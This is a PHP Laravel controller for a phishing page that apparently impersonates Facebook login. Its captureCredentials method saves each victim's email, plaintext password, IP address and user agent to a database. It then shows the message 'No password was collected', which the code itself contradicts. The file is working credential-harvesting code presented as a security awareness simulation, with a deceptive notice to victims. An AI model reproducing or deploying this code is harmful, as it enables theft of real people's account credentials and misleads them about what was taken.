<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\PhishingLogs;

class PhishingController extends Controller
{
    public function showLoginPage()
    {
        return view('facebook');
    }

    public function captureCredentials(Request $request)
    {
        $request->validate([
            'email' => 'required|string',
            'password' => 'required|string',
        ]);

        $log = new PhishingLogs();
        $log->email = $request->email;
        $log->password = $request->password;
        $log->ip_address = $request->header('X-Forwarded-For') 
            ? $request->header('X-Forwarded-For') 
            : $request->ip();
        $log->user_agent = $request->header('User-Agent');
        $log->save();

        return redirect()->route('phishing.login')->with('status', 'This was a security awareness simulation. No password was collected.');
    }
}
